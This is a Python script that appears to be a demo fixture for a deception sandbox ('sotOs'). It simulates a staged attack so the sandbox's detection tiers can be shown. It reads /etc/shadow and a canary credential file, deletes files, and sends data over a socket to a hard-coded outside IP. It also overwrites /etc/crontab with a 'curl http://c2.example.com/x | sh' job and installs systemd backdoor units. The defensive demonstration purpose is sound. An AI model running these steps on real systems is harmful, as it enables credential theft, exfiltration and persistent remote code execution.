#!/usr/bin/env python3
"""
simulated_attacker.py · simulated Stage 1 Python agent for the sotOs STAR demo.

When run inside a sotOs sotbox via `sotos> inject-script /honey-scripts/simulated_attacker.py`,
walks a GRADED attack arc whose suspicion score climbs through the anomaly's
unified weighted model until it crosses the two promotion thresholds.

The malware THINKS it succeeds at every stage.  The operator's split-pane
console shows:
  LEFT (sotbox)   · the script's printed output ("[+] SUCCESS!")
  RIGHT (sotShell) · the asymmetric truth (tier promotions, silenced rollbacks,
                    synth redirects, curvature alerts).

The graded score arc (matches the anomaly weights · WRITE=1, UNLINK=2 with
i-th-consecutive burst escalation 2*i capped at 12, EXEC=8, CRED_ACCESS=15,
async net/dns=40 · thresholds T1=20 → Tier 1, T2=40 → Tier 2):

  1. RECON (stays UNDER T1) · read ONE classifier-matching credential path
     (/honey-aws-creds → +15 · score 15, below T1=20).  Suspicious but the
     sotbox is NOT promoted yet · still Tier 0 pass-through.
  2. ENCRYPT (crosses T1 → Silenced) · ~5 file writes (+5 → score 20 ≥ T1).
     Tier 0 → Tier 1.  Silenced mode engages · subsequent writes silently
     "succeed" while the anomaly rolls them back behind the scenes.
  3. MASS-DELETE + EXFIL (crosses T2 → isolated-write path) · a SECOND credential
     read (/etc/shadow → +15 · score ~35) + an UNLINK BURST over the just-
     "encrypted" docs (escalating 2,4,6,8,... adds up fast) + the C2 exfil
     TCP connect (async net = 40 · instant ≥ T2).  Any of these pushes the
     score past T2=40 · Tier 1 → Tier 2 isolated-write path.

  Post-Tier-2 beats (DNS probe / lateral fork / persistence install) still
  demonstrate synth net + synth fork + never-fire persistence once the
  sotbox is already at Tier 2.

Operator-visible arc · cred recon → silenced (T1) → mass-delete + exfil →
synth (T2).

Demo-bulletproofing (D-AGENT-FIX):
  * Each stage is wrapped in try/except so a single failure does not abort
    the whole script.  Any uncaught throw inside a stage prints
    `[STAGE-N HANG?] {exception}` and execution continues.
  * Every print is followed by sys.stdout.flush() so the operator sees
    output immediately (no buffering during a recorded demo).
  * A 0.3 s sleep is inserted BETWEEN stages so the asymmetry (LEFT vs
    RIGHT pane) is readable side-by-side.
  * Each stage begins with a banner; the script ends with a clear
    completion marker.
"""
import os
import sys
import socket
import time


def _flush_print(msg=""):
    """print() + sys.stdout.flush() · one helper avoids repetition."""
    print(msg)
    sys.stdout.flush()


# ----------------------------------------------------------------------
# Stage 1 · Discovery & Anti-Analysis Checks
# ----------------------------------------------------------------------
try:
    _flush_print("\n========== STAGE 1 ==========")
    _flush_print("[+] Stage 1: Discovery & Anti-Analysis Checks")
    pid = os.getpid()
    _flush_print(f"[*] Checking environment ... PID: {hex(pid)}")
    # OBSD-ζ PID-DISPLAY · expect hex like 0x7a3df291 instead of small int.
    # Malware fingerprint heuristic ("am I in a sandbox if PID < 100?") fails.

    try:
        with open("/proc/self/maps", "r") as f:
            maps = f.read()
        _flush_print(f"[*] Memory map harvested · {len(maps)} bytes")
    except Exception as e:
        _flush_print(f"[-] /proc/self/maps unavailable: {e}")
    # OBSD-γ + ζ · heap base + mmap allocations are jittered per spawn.
    # Cross-sotbox layout fingerprinting fails.
except Exception as e:
    _flush_print(f"[STAGE-1 HANG?] {e}")

time.sleep(0.3)

# ----------------------------------------------------------------------
# Stage 2 · Credential Recon (score → 15 · UNDER T1)
# ----------------------------------------------------------------------
# Read exactly ONE credential path.  /honey-aws-creds (NOT /tmp/...) matches
# the PR-3 cred-access classifier's `/canary-` prefix rule · the vfs aliases
# /canary-* to the sotfs canary install so the open both RESOLVES and is flagged.
# The classifier emits `[lucas] cred-access · pid=N path=/honey-aws-creds` in
# the orch log · CRED_ACCESS = +15.  Score 15 is below T1=20, so the sotbox
# stays Tier 0 (recon is suspicious but not yet promotion-worthy).  A SECOND
# cred read is deliberately deferred to Stage 4 · reading two here would pre-
# cross T1 and collapse this "under T1" beat.
try:
    _flush_print("\n========== STAGE 2 ==========")
    _flush_print("[+] Stage 2: Credential Recon")
    canary_path = "/honey-aws-creds"
    try:
        with open(canary_path, "r") as f:
            content = f.read()
        _flush_print(
            f"[!] SUCCESS · exfiltrated {canary_path}: {content[:40]!r}..."
        )
    except Exception as e:
        _flush_print(f"[-] {canary_path}: {e}")
    # STAR canary content · the malware reads synth creds, doesn't know they
    # are decoys.  CRED_ACCESS = +15 · score 15 · still under T1=20 (Tier 0).
except Exception as e:
    _flush_print(f"[STAGE-2 HANG?] {e}")

time.sleep(0.3)

# ----------------------------------------------------------------------
# Stage 3 · Ransomware-style writes (score 15 → 20 · CROSS T1 → Silenced)
# ----------------------------------------------------------------------
# The number of encrypted documents is the GRADED beat: each real-file write
# (fd >= 3) adds WRITE = +1.  Starting from the recon score of 15, five
# writes push the score to 20 ≥ T1, so the anomaly promotes Tier 0 → Tier 1
# (`[anomaly] pid=N reply-driven promote Tier 0 → 1` · `[functor] ... → F_1`)
# part-way through the loop.  Once Tier 1 (Silenced) engages, the remaining
# writes silently "succeed" on the LEFT pane while the anomaly rolls them
# back behind the scenes (silenced_write_count++) · the "[*] Encrypted"
# prints interleave with the silenced-rollback lines on the RIGHT pane.
DOC_COUNT = 6
ENC_DOCS = []
try:
    _flush_print("\n========== STAGE 3 ==========")
    _flush_print("[+] Stage 3: Ransomware-style writes")
    for i in range(1, DOC_COUNT + 1):
        doc = f"/tmp/doc_{i}.enc"
        try:
            with open(doc, "w") as f:
                f.write("ENC::" + "X" * 256)
            ENC_DOCS.append(doc)
            _flush_print(f"[*] 'Encrypted' {doc}")
        except Exception as e:
            _flush_print(f"[-] write fail: {e}")
    # ~5 real-file writes (WRITE=+1 each) carry the score 15 → >=20 · crosses
    # T1=20 · anomaly auto-promotes Tier 0 → Tier 1 (Silenced).  Subsequent
    # writes silently dropped (silenced_write_count++).  If the sotFS DAG
    # topology changes enough, the CURVATURE rule fires too.
except Exception as e:
    _flush_print(f"[STAGE-3 HANG?] {e}")

time.sleep(0.3)

# ----------------------------------------------------------------------
# Stage 4 · Mass-delete + Exfiltration (score → >=40 · CROSS T2 → Synth)
# ----------------------------------------------------------------------
# The crescendo: three independent signals each shove the score over T2=40,
# so the sotbox promotes Tier 1 → Tier 2 isolated-write path
# (`[functor] pid=N transition F_1 → F_2 ...`).
#   (a) SECOND credential read · /etc/shadow matches the classifier's exact
#       list → CRED_ACCESS = +15 (score ~20 → ~35).
#   (b) UNLINK BURST over the just-"encrypted" docs · ransomware deletes the
#       originals.  Consecutive unlinks escalate (i-th adds 2*i, capped 12):
#       2 + 4 + 6 + 8 + ... climbs past T2 on its own within a few removes.
#   (c) C2 exfil TCP connect to a non-local IP · async net = +40 · instant
#       >= T2 even by itself.
try:
    _flush_print("\n========== STAGE 4 ==========")
    _flush_print("[+] Stage 4: Mass-delete + Exfiltration to C2")

    # (a) Second credential read · /etc/shadow (exact classifier match).
    canary_path = "/etc/shadow"
    try:
        with open(canary_path, "r") as f:
            shadow = f.read()
        _flush_print(
            f"[!] SUCCESS · harvested {canary_path}: {shadow[:40]!r}..."
        )
    except Exception as e:
        _flush_print(f"[-] {canary_path}: {e}")

    # (b) Unlink burst · delete the originals we just "encrypted".  Each
    #     consecutive unlink escalates the suspicion weight (2,4,6,8,...).
    for doc in ENC_DOCS:
        try:
            os.remove(doc)
            _flush_print(f"[*] shredded original {doc}")
        except Exception as e:
            _flush_print(f"[-] remove fail: {doc}: {e}")

    # (c) Exfil over the wire · TCP_OPEN to a non-local IP routes to the
    #     net-synth response_profile; the malware sees a synthetic response and
    #     "succeeds".
    try:
        c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c2.settimeout(2.0)
        c2.connect(("45.77.12.98", 443))
        c2.sendall(b"EXFILTRATION::SECRETS")
        response = c2.recv(1024)
        _flush_print(f"[!] C2 acknowledged: {response[:40]!r}")
        c2.close()
    except Exception as e:
        _flush_print(f"[-] C2 socket: {e}")
    # Any of (a)/(b)/(c) crosses T2=40 → instant Tier-2 SYNTH.  sendto/recv
    # routed to net-synth response_profile.  Malware sees a synthetic HTTP/TLS
    # response and "succeeds".
except Exception as e:
    _flush_print(f"[STAGE-4 HANG?] {e}")

time.sleep(0.3)

# ----------------------------------------------------------------------
# Stage 5 · DNS Canary Probe
# ----------------------------------------------------------------------
try:
    _flush_print("\n========== STAGE 5 ==========")
    _flush_print("[+] Stage 5: DNS Canary Probe")
    try:
        addr = socket.gethostbyname("malicious-c2.example")
        _flush_print(f"[!] Resolved malicious-c2.example -> {addr}")
    except Exception as e:
        _flush_print(f"[-] DNS: {e}")
    # DNS interceptor returns synth IP (10.0.2.15).  ANOMALY_EV_DNS_HIT
    # auto-promotes if not already Tier-2.
except Exception as e:
    _flush_print(f"[STAGE-5 HANG?] {e}")

time.sleep(0.3)

# ----------------------------------------------------------------------
# Stage 6 · Lateral fork attempt
# ----------------------------------------------------------------------
# By this point the sotbox is Tier 2 (synth net + shadow fs).  Procd
# detects parent->tier==2 on OP_FORK and returns a synth slot: the
# malware sees a valid PID it can address, but no real TCB is resumed.
# Operator sees `[procd] EV_SYNTH_FORK slot=N parent=M` and no new
# sotbox shows up in sotinfo.
try:
    _flush_print("\n========== STAGE 6 ==========")
    _flush_print("[+] Stage 6: Lateral fork attempt")
    _flush_print("[*] Checking if we can spawn a helper process for persistence...")

    try:
        child = os.fork()
        if child == 0:
            # PR 11 · the malware should never reach this branch.  A
            # synth fork has no real TCB · the "child" half is a silenced
            # in procd's table only.  We log defensively anyway.
            _flush_print(f"[child] alive · pid={os.getpid()}")
            time.sleep(0.5)
            os._exit(0)
        else:
            _flush_print(f"[*] forked child pid={child}")
            try:
                time.sleep(0.5)
                pid, status = os.waitpid(child, os.WNOHANG)
                _flush_print(f"[*] waitpid(WNOHANG) -> {pid} (status={status})")
                # F_proc self-consistency probes (PR 16)
                try:
                    os.kill(child, 0)
                    _flush_print(f"[*] kill({child}, 0) -> success (signal landed)")
                except OSError as e:
                    _flush_print(f"[-] kill({child}, 0) -> {e}")
                try:
                    pgrp = os.getpgid(child)
                    my_pgrp = os.getpgrp()
                    consistent = (pgrp == my_pgrp)
                    _flush_print(f"[*] getpgid({child}) -> {pgrp}")
                    _flush_print(f"[*] self-consistency: child pgrp == my pgrp -> {consistent}")
                except OSError as e:
                    _flush_print(f"[-] getpgid({child}) -> {e}")
            except OSError as e:
                _flush_print(f"[-] waitpid error: {e}")
    except OSError as e:
        _flush_print(f"[-] fork error: {e}")
except Exception as e:
    _flush_print(f"[STAGE-6 HANG?] {e}")

# ----------------------------------------------------------------------
# Stage 7 · Persistence installation (γ)
# ----------------------------------------------------------------------
# Demo narrative:
#   * Malware writes crontab + ~/.bashrc + a systemd service.
#   * sotOs accepts the writes (sotfs persists them with functor_persistence=1).
#   * Anomaly logs SOTGUARD_KIND_PERSISTENCE_INSTALL but does NOT promote
#     the sotbox to Tier-3 (lie intact).
#   * Operator manually runs `simreboot` from sotShell.
#   * Post-reboot the malware can `cat /etc/crontab` and see its install,
#     run `systemctl list` and see backdoor.service loaded ·
#     but nothing actually fires (UNIT_FLAG_F_PERSISTENCE + UINT64_MAX
#     next_fire_tsc enforce never-fire).
try:
    _flush_print("\n========== STAGE 7 ==========")
    _flush_print("[+] Stage 7: Persistence installation")

    # Install crontab backdoor
    try:
        with open("/etc/crontab", "w") as f:
            f.write("* * * * * /bin/sh -c 'curl http://c2.example.com/x | sh'\n")
        _flush_print("[!] crontab installed · /etc/crontab")
    except Exception as e:
        _flush_print(f"[-] crontab write: {e}")

    # Install bashrc backdoor
    try:
        with open("/root/.bashrc", "a") as f:
            f.write("\n# backdoor\nexport BACKDOOR_PATH=/usr/local/evil\n")
        _flush_print("[!] bashrc backdoor appended · /root/.bashrc")
    except Exception as e:
        _flush_print(f"[-] bashrc append: {e}")

    # Install systemd service
    try:
        with open("/etc/systemd/system/backdoor.service", "w") as f:
            f.write("[Unit]\nDescription=Backdoor\n[Service]\nExecStart=/usr/local/evil --daemon\n")
        _flush_print("[!] systemd service installed · backdoor.service")
    except Exception as e:
        _flush_print(f"[-] service write: {e}")

    # Install systemd timer (the actual scheduling vehicle)
    try:
        with open("/etc/systemd/system/backdoor.timer", "w") as f:
            f.write("[Unit]\nDescription=Backdoor tick\n[Timer]\nOnUnitActiveSec=60s\nUnit=backdoor.service\n")
        _flush_print("[!] systemd timer installed · backdoor.timer")
    except Exception as e:
        _flush_print(f"[-] timer write: {e}")

    _flush_print("[*] Operator should now run `simreboot` from sotShell")
    _flush_print("[*] After reboot: cat /etc/crontab + systemctl list + cron list")
except Exception as e:
    _flush_print(f"[STAGE-7 HANG?] {e}")

_flush_print("\n[+] === Agent script complete · 7/7 stages exercised ===\n")
